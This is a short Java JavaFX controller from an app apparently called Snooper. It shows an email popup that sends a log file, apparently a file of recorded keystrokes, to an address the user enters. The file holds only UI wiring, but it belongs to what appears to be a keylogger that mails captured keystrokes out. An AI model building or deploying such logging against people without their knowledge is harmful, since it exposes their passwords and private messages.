package com.snooper.app.controller;

import javafx.fxml.FXML;
import javafx.scene.control.*;

import java.io.*;
import com.snooper.tray.*;

import com.snooper.*;
import com.snooper.app.*;

public class EmailPopupController extends Controller {
	
	@FXML private Label filenameLabel;
	@FXML private TextField emailTextField;
	@FXML private Button sendEmailButton;
	
	private SLogFile sLogFile;
	
	@FXML
	public void initialize() {
		System.out.println("INIT: EmailPopupController.java");
	}
	
	@FXML
	private void sendEmail() {
		String email = emailTextField.getText();
		new Thread(new SendEmailTask(email,sLogFile)).start();
		stage.close();
	}
	
	@Override
	public void send(Object data) {
		if (data instanceof SLogFile) {
			sLogFile = (SLogFile) data;
			
			if (!sLogFile.isTemp()) {
				filenameLabel.setText(sLogFile.getFilename());
			} else {
				filenameLabel.setText(Snooper.getInstance().getKeyStrokesFile().getName());
			}
		}
	}
}